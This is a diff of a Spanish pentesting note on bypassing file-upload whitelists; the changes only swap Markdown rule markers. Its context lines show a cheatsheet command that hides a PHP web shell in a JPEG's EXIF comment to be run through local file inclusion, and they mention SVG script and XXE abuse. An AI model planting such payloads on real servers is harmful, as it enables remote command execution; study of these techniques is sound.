@@ -10,7 +10,7 @@ linked:
 ---
 # File Upload - Bypass de Filtros de Lista Blanca
 
-***
+---
 
 ## Cheatsheet
 
@@ -63,7 +63,7 @@ exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg
 # Si existe LFI: ?file=/uploads/real.jpg → ejecuta el PHP del EXIF
 ```
 
-___
+---
 
 ## Overview
 
@@ -77,4 +77,4 @@ Whitelist = filtro acepta SOLO lista predefinida de ext (`.jpg`, `.pdf`, `.png`)
 
 SVG es el target preferido cuando está en whitelist — XML nativo, permite `<script>` y XXE.
 
-***
+---
